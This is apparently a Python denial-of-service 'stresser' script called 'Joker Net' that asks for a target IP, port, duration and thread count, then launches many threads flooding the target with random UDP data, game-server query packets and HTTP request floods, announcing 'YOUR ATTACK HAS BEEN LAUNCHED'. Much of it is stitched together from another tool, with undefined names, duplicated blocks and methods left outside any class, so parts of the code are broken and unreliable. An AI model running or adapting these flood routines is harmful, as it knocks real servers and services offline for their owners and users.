#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import random
import os
import codecs
import struct
import time
import sys
from subprocess import run, PIPE
from json import load
import socket
import threading

nicknm = "Acee"

os.system("clear")
print("""
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                              We are al\033[32ml clowns 

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Joker Net By \033[36m@Acee \033[35m- - -  - - - -║
\033[35m                ║\033[32m  - - - Build Date \033[36m22 June\033[35m 2022 - - - - -  - - ║
\033[35m                ╚═══════════════════════════════════════════════╝


		   \033[32m- LAYER4 : OVHUDP UDP UDPF FIVEM TCP RDP


		    \033[32m- LAYER7 : OVH STRESS CFB KILLER BYPASS TCPRAW TCPRAPE


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
""")

ip = str(input(" Target Ip/Host :"))
port = int(input(" Target Port :"))
choice = str(input(" Want To Use Methods? :"))
times = int(input(" How Much Time :"))
threads = int(input(" How Much Threads :"))
fake_ip = '49.128.187.58'
#PROGRAM STARTING
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2;Joker. | Devices: [{}] | SPOOFed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Joker]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

def TCPRAW(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

def TCPRAPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]

def OVHUDP(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b"\x00\x02\x00\x2f"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

def kontol():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol2():
	data = random._urandom(102400)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol3():
	data = random._urandom(1021)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol4():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol5():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol6():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol7():
	data = random._urandom(1201)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol8():
	data = random._urandom(1402)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol9():
	data = random._urandom(102400)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol10():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol11():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol12():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol13():
	data = random._urandom(128192)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol14():
	data = random._urandom(2048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol15():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

def kontol16():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED!!!")
		except:
			print("[!] SERVER DOWN")

#PROGRAM DONE
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                
         
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

#LAYER7
    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "KILLER": self.SENT_FLOOD = self.KILLER

#LAYER4
    def select(self, name):
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
        if name == "TCP": self.SENT_FLOOD = self.TCP

        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

for y in range(threads):
    if choice == 'UDPF':
        th = threading.Thread(target = kontol)
        th.start()
        th = threading.Thread(target = kontol2)
        th.start()
        th = threading.Thread(target = kontol3)
        th.start()
        th = threading.Thread(target = kontol4)
        th.start()
        th = threading.Thread(target = kontol5)
        th.start()
        th = threading.Thread(target = kontol6)
        th.start()
        th = threading.Thread(target = kontol7)
        th.start()
        th = threading.Thread(target = kontol8)
        th.start()
        th = threading.Thread(target = kontol9)
        th.start()
        th = threading.Thread(target = kontol10)
        th.start()
        th = threading.Thread(target = kontol11)
        th.start()
        th = threading.Thread(target = kontol12)
        th.start()
        th = threading.Thread(target = kontol13)
        th.start()
        th = threading.Thread(target = kontol14)
        th.start()
        th = threading.Thread(target = kontol15)
        th.start()
else:
        th = threading.Thread(target = kontol16)
        th.start()